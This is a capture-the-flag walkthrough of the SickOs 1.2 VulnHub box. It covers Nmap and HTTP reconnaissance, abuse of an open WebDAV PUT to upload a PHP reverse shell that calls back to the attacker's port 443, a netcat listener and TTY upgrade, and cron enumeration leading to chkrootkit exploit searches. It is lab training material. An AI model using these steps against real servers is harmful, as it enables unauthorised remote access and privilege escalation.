# Boot2RootCTF_SickOs1.2

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/sickos-12,144/) and set it up with VMware Workstation 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
sudo nmap -sS -sC -Pn -PA -A -T4 -v -f --version-all --osscan-guess 192.168.57.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 09:55 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:55
...
Completed NSE at 09:55, 0.00s elapsed
Initiating ARP Ping Scan at 09:55
Scanning 192.168.57.131 [1 port]
Completed ARP Ping Scan at 09:55, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:55
Completed Parallel DNS resolution of 1 host. at 09:55, 0.02s elapsed
Initiating SYN Stealth Scan at 09:55
Scanning 192.168.57.131 [1000 ports]
Discovered open port 22/tcp on 192.168.57.131
Discovered open port 80/tcp on 192.168.57.131
Completed SYN Stealth Scan at 09:55, 4.89s elapsed (1000 total ports)
Initiating Service scan at 09:55
Scanning 2 services on 192.168.57.131
Completed Service scan at 09:55, 6.01s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 192.168.57.131
NSE: Script scanning 192.168.57.131.
Initiating NSE at 09:55
...
Completed NSE at 09:55, 0.00s elapsed
Nmap scan report for 192.168.57.131
Host is up (0.00043s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)
|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)
|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)
80/tcp open  http    lighttpd 1.4.28
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: lighttpd/1.4.28
MAC Address: 00:0C:29:08:63:99 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.16 - 4.6, Linux 3.2 - 4.9
Uptime guess: 198.841 days (since Mon Dec 13 12:44:56 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=249 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.43 ms 192.168.57.131

NSE: Script Post-scanning.
Initiating NSE at 09:55
...
Completed NSE at 09:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.21 seconds
           Raw packets sent: 2041 (92.308KB) | Rcvd: 13 (652B)
```

We can first see that ports 22 and 80 are open, indicating that this is most likely an HTTP website.

Performing a more aggressive Nmap scan with some HTTP NSE scripts reveal a bit more.

```
sudo nmap -sS -sC -Pn -PA -A -T4 -v -f --version-all --osscan-guess --script *http*.nse -p 80 192.168.57.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-30 09:57 EDT
NSE: Loaded 180 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 09:57
...
...
...
Bug in http-security-headers: no string output.
PORT   STATE SERVICE VERSION
80/tcp open  http    lighttpd 1.4.28
|_http-server-header: lighttpd/1.4.28
|_http-feed: Couldn't find any feeds.
|_http-jsonp-detection: Couldn't find any JSONP endpoints.
|_http-wordpress-enum: Nothing found amongst the top 100 resources,use --script-args search-limit=<number|all> for deeper analysis)
|_http-xssed: No previously reported XSS vuln.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-date: Thu, 30 Jun 2022 14:27:29 GMT; -1s from local time.
| http-vhosts: 
|_128 names had status 200
| http-php-version: Versions from logo query (less accurate): 5.3.0 - 5.3.29, 5.4.0 - 5.4.45
| Versions from credits query (more accurate): 5.3.9 - 5.3.29
|_Version from header x-powered-by: PHP/5.3.10-1ubuntu3.21
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; jpg: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; jpg: 1
|_http-fetch: Please enter the complete path of the directory to save data in.
|_http-mobileversion-checker: No mobile version detected.
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-title: Site doesn't have a title (text/html).
|_http-malware-host: Host appears to be clean
|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
| http-brute:   
|_  Path "/" does not require authentication
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-headers: 
|   X-Powered-By: PHP/5.3.10-1ubuntu3.21
|   Content-type: text/html
|   Connection: close
|   Date: Thu, 30 Jun 2022 13:57:25 GMT
|   Server: lighttpd/1.4.28
|   
|_  (Request type: HEAD)
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-config-backup: ERROR: Script execution failed (use -d to debug)
|_http-slowloris: false
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
|_http-chrono: Request times for /; avg: 151.65ms; min: 150.70ms; max: 152.82ms
| http-enum: 
|_  /test/: Test page
|_http-exif-spider: ERROR: Script execution failed (use -d to debug)
|_http-errors: Couldn't find any error pages.
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.57.131
|     
|     Path: http://192.168.57.131:80/
|     Line number: 96
|     Comment: 
|         <!-- NOTHING IN HERE ///\\\ -->
|     
|     Path: http://192.168.57.131:80/
|     Line number: 96
|     Comment: 
|_         ///\\\ -->>>>
|_http-drupal-enum: Nothing found amongst the top 100 resources,use --script-args number=<number|all> for deeper analysis)
...
...
...
Completed NSE at 10:28, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1877.56 seconds
           Raw packets sent: 42 (4.352KB) | Rcvd: 10 (520B)
```

While there's a lot of things to look at here, the main thing I got from this scan was what ```http-enum``` found: A folder labeled ```/test/```.

Opening ```/test/``` in Firefox didn't reveal much, so I opened BurpSuite to see what I could do about manipulating HTTP requests.

In BurpSuite, I captured a GET request for the ```/test/``` folder and changed the request to an OPTIONS request.

Doing this revealed that there was more I could do with the page.

Request:
```
OPTIONS /test HTTP/1.1
Host: 192.168.57.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
Response:
```
HTTP/1.1 301 Moved Permanently
DAV: 1,2
MS-Author-Via: DAV
Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
Location: http://192.168.57.131/test/
Content-Length: 0
Connection: close
Date: Thu, 30 Jun 2022 15:32:03 GMT
Server: lighttpd/1.4.28
```

## Step 2 - Exploitation

We were allowed to drop files onto the server, which meant we could easily drop a PHP reverse shell script onto it and request it to open a connection.

So that's exactly what I did.

I first sent a ```PUT /test/catshell.php``` request, and was given a ```HTTP/1.1 201 Created``` response, meaning all went well.

With a NetCat listener already running, I sent a ```GET /test/catshell.php``` request. Surprisingly, it didn't work.

What I was greeted with instead was an error message:

```
WARNING: Failed to daemonise.  This is quite common and not fatal.
Successfully opened reverse shell to 192.168.57.129:443
ERROR: Shell connection terminated
 ```
 
First, I had tried listening on 4444, so I figured there was a firewall disallowing outbound connections to unknown ports.

With this in mind, I edited the script to reflect 443 instead of 4444, and reuploaded it.

This time, it worked.

```
sudo nc -lvnp 443     
[sudo] password for meowmycks: 
listening on [any] 443 ...
connect to [192.168.57.129] from (UNKNOWN) [192.168.57.131] 37915
```

I upgraded to a TTY shell.

```
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@ubuntu:/$ ^Z
zsh: suspended  sudo nc -lvnp 443
                                                                                                                                                                                                                                            
┌──(meowmycks㉿catBook)-[~]
└─$ stty raw -echo;fg
[1]  + continued  sudo nc -lvnp 443


www-data@ubuntu:/$ export TERM=xterm
export TERM=xterm
```

## Step 3 - Privilege Escalation

Now that I had a foothold on the server, I could focus on upgrading to root.

Using information from [this website](https://steflan-security.com/linux-privilege-escalation-checklist/), I used a series of commands to try and find an opening for a privilege escalation.

Using the following command, I was able to retrieve some important information regarding cron jobs on the system.

```
crontab -l; ls -alh /var/spool/cron; ls -al /etc/ | grep cron; ls -al /etc/cron*; cat /etc/cron*; cat /etc/at.allow; cat /etc/at.deny; cat /etc/cron.allow; cat /etc/cron.deny; cat /etc/crontab; cat /etc/anacrontab; cat /var/spool/cron/crontabs/root
crontab; cat /etc/anacrontab; cat /var/spool/cron/crontabs/rootn.deny; cat /etc/
```
```
ls: cannot open directory /etc/cron.d: Permission denied
/etc/cron.daily:
total 72
drwxr-xr-x  2 root root  4096 Apr 12  2016 .
drwxr-xr-x 84 root root  4096 Jun 30 09:47 ..
-rw-r--r--  1 root root   102 Jun 19  2012 .placeholder
-rwxr-xr-x  1 root root 15399 Nov 15  2013 apt
-rwxr-xr-x  1 root root   314 Apr 18  2013 aptitude
-rwxr-xr-x  1 root root   502 Mar 31  2012 bsdmainutils
-rwxr-xr-x  1 root root  2032 Jun  4  2014 chkrootkit
-rwxr-xr-x  1 root root   256 Oct 14  2013 dpkg
-rwxr-xr-x  1 root root   338 Dec 20  2011 lighttpd
-rwxr-xr-x  1 root root   372 Oct  4  2011 logrotate
-rwxr-xr-x  1 root root  1365 Dec 28  2012 man-db
-rwxr-xr-x  1 root root   606 Aug 17  2011 mlocate
-rwxr-xr-x  1 root root   249 Sep 12  2012 passwd
-rwxr-xr-x  1 root root  2417 Jul  1  2011 popularity-contest
-rwxr-xr-x  1 root root  2947 Jun 19  2012 standard
```

In particular, I looked at ```chkrootkit``` being installed and investigated it some more.

```
ww-data@ubuntu:/var/www/test/linux-smart-enumeration$ dpkg -l | grep chkrootkit
rc  chkrootkit                      0.49-4ubuntu1.1                   rootkit detector
```

This revealed that the currently running version of chkrootkit was outdated.

Upon searching for an exploit, I found one for Metasploit for a Local Privilege Escalation that would work on this version of chkrootkit.

```
searchsploit chkrootkit
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                                                                      | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                                                                              | linux/local/33899.txt
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
